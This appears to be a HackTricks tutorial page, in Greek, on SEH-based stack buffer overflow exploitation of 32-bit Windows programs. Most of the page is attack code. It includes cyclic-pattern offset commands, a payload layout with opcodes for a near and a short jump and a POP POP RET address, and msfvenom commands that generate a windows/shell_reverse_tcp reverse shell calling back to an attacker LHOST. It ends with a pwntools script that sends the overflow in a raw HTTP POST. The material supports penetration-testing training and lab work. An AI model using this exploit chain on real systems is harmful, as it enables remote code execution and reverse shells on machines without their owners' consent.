# Windows SEH-based Stack Overflow Exploitation (nSEH/SEH)

{{#include ../../banners/hacktricks-training.md}}

SEH-based exploitation είναι μια κλασική x86 Windows τεχνική που καταχράται την Structured Exception Handler chain αποθηκευμένη στο stack. Όταν ένα stack buffer overflow υπεργράφει τα δύο 4-byte πεδία

- nSEH: pointer to the next SEH record, και
- SEH: pointer to the exception handler function

an attacker μπορεί να πάρει τον έλεγχο της εκτέλεσης με:

1) Setting SEH στην διεύθυνση ενός POP POP RET gadget σε ένα non-protected module, έτσι ώστε όταν dispatchαριστεί ένα exception το gadget να επιστρέψει σε attacker-controlled bytes, και
2) Using nSEH για να ανακατευθύνει την εκτέλεση (συνήθως ένα short jump) πίσω στο μεγάλο overflowing buffer όπου βρίσκεται το shellcode.

Αυτή η τεχνική είναι ειδική για 32-bit processes (x86). Σε μοντέρνα συστήματα, προτίμησε ένα module χωρίς SafeSEH και ASLR για το gadget. Bad characters συχνά περιλαμβάνουν 0x00, 0x0a, 0x0d (NUL/CR/LF) λόγω C-strings και HTTP parsing.

---

## Εύρεση ακριβών offsets (nSEH / SEH)

- Crash the process και verify ότι η SEH chain έχει overwritten (π.χ. in x32dbg/x64dbg, check το SEH view).
- Στείλε ένα cyclic pattern ως τα overflowing δεδομένα και υπολόγισε τα offsets των δύο dwords που καταλήγουν σε nSEH και SEH.

Παράδειγμα με peda/GEF/pwntools σε ένα 1000-byte POST body:
```bash
# generate pattern (any tool is fine)
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
# or
python3 -c "from pwn import *; print(cyclic(1000).decode())"

# after crash, note the two 32-bit values from SEH view and compute offsets
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x32424163   # nSEH
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x41484241   # SEH
# ➜ offsets example: nSEH=660, SEH=664
```
Επικύρωσε τοποθετώντας δείκτες σε αυτές τις θέσεις (π.χ., nSEH=b"BB", SEH=b"CC"). Κράτησε το συνολικό μήκος σταθερό για να κάνεις το crash αναπαραγώγιμο.

---

## Επιλογή ενός POP POP RET (SEH gadget)

Χρειάζεσαι μια ακολουθία POP POP RET για να απο-διπλώσεις το SEH frame και να επιστρέψεις στα nSEH bytes σου. Βρες την σε ένα module χωρίς SafeSEH και ιδανικά χωρίς ASLR:

- Mona (Immunity/WinDbg): `!mona modules` στη συνέχεια `!mona seh -m modulename`.
- x64dbg plugin ERC.Xdbg: `ERC --SEH` για να εμφανίσεις POP POP RET gadgets και την κατάσταση SafeSEH.

Επίλεξε μια διεύθυνση που δεν περιέχει badchars όταν γραφτεί little-endian (π.χ., `p32(0x004094D8)`). Προτίμησε gadgets μέσα στο vulnerable binary αν οι προστασίες το επιτρέπουν.

---

## Τεχνική jump-back (short + near jmp)

Το nSEH είναι μόνο 4 bytes, που χωράει το πολύ ένα 2-byte short jump (`EB xx`) συν padding. Αν πρέπει να πηδήξεις πίσω εκατοντάδες bytes για να φτάσεις στην αρχή του buffer σου, χρησιμοποίησε ένα 5-byte near jump τοποθετημένο ακριβώς πριν το nSEH και κάνε chain σε αυτό με ένα short jump από το nSEH.

Με nasmshell:
```text
nasm> jmp -660           ; too far for short; near jmp is 5 bytes
E967FDFFFF
nasm> jmp short -8       ; 2-byte short jmp fits in nSEH (with 2 bytes padding)
EBF6
nasm> jmp -652           ; 8 bytes closer (to account for short-jmp hop)
E96FFDFFFF
```
Ιδέα διάταξης για ένα payload 1000-byte με nSEH στο offset 660:
```python
buffer_length = 1000
payload  = b"\x90"*50 + shellcode                    # NOP sled + shellcode at buffer start
payload += b"A" * (660 - 8 - len(payload))           # pad so we are 8 bytes before nSEH
payload += b"\xE9\x6F\xFD\xFF\xFF" + b"EEE"     # near jmp -652 (5B) + 3B padding
payload += b"\xEB\xF6" + b"BB"                      # nSEH: short jmp -8 + 2B pad
payload += p32(0x004094D8)                           # SEH: POP POP RET (no badchars)
payload += b"D" * (buffer_length - len(payload))
```
Execution flow:
- Παρουσιάζεται exception, ο dispatcher χρησιμοποιεί το overwritten SEH.
- POP POP RET ξετυλίγεται στο nSEH μας.
- nSEH εκτελεί `jmp short -8` προς το 5-byte near jump.
- Near jump προσγειώνεται στην αρχή του buffer μας όπου βρίσκονται το NOP sled + shellcode.

---

## Κακοί χαρακτήρες

Δημιουργήστε μια πλήρη badchar string και συγκρίνετε τη stack memory μετά το crash, αφαιρώντας bytes που παραμορφώνονται από τον target parser. Για HTTP-based overflows, `\x00\x0a\x0d` σχεδόν πάντα εξαιρούνται.
```python
badchars = bytes([x for x in range(1,256)])
payload  = b"A"*660 + b"BBBB" + b"CCCC" + badchars  # position appropriately for your case
```
---

## Δημιουργία Shellcode (x86)

Χρησιμοποιήστε msfvenom με τα badchars σας. Ένα μικρό NOP sled βοηθά να αντέξει τη διακύμανση του σημείου προσγείωσης.
```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> \
-b "\x00\x0a\x0d" -f python -v sc
```
Εάν παράγεται on the fly, η μορφή hex είναι βολική για ενσωμάτωση και unhex σε Python:
```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> \
-b "\x00\x0a\x0d" -f hex
```
---

## Παράδοση μέσω HTTP (ακριβή CRLF + Content-Length)

Όταν ο ευάλωτος φορέας είναι το σώμα ενός αιτήματος HTTP, κατασκευάστε ένα raw request με ακριβή CRLFs και Content-Length ώστε ο server να διαβάσει ολόκληρο το υπερχειλίζον σώμα.
```python
# pip install pwntools
from pwn import remote
host, port = "<TARGET_IP>", 8080
body = b"A" * 1000  # replace with the SEH-aware buffer above
req = f"""POST / HTTP/1.1
Host: {host}:{port}
User-Agent: curl/8.5.0
Accept: */*
Content-Length: {len(body)}
Connection: close

""".replace('\n','\r\n').encode() + body
p = remote(host, port)
p.send(req)
print(p.recvall(timeout=0.5))
p.close()
```
---

## Εργαλεία

- x32dbg/x64dbg για να παρατηρήσετε το SEH chain και να τριάρετε το crash.
- ERC.Xdbg (x64dbg plugin) για να απαριθμήσετε SEH gadgets: `ERC --SEH`.
- Mona ως εναλλακτική: `!mona modules`, `!mona seh`.
- nasmshell για να συναρμολογήσετε short/near jumps και να αντιγράψετε raw opcodes.
- pwntools για να κατασκευάσετε ακριβή network payloads.

---

## Σημειώσεις και επιφυλάξεις

- Ισχύει μόνο για x86 διαδικασίες. Το x64 χρησιμοποιεί διαφορετικό SEH scheme και η εκμετάλλευση βασισμένη σε SEH γενικά δεν είναι βιώσιμη.
- Προτιμήστε gadgets σε modules χωρίς SafeSEH και ASLR· αλλιώς, βρείτε ένα μη προστατευμένο module φορτωμένο στη διαδικασία.
- Τα service watchdogs που επανεκκινούν αυτόματα μετά από crash μπορούν να διευκολύνουν την επαναληπτική ανάπτυξη exploit.

## Αναφορές
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf)](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [ERC.Xdbg – Exploit Research Plugin for x64dbg (SEH search)](https://github.com/Andy53/ERC.Xdbg)
- [Corelan – Exploit writing tutorial part 7 (SEH)](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-7-unicode-0day-buffer-overflow-seh-and-venetian-shellcode/)
- [Mona.py – WinDbg/Immunity helper](https://github.com/corelan/mona)

{{#include ../../banners/hacktricks-training.md}}
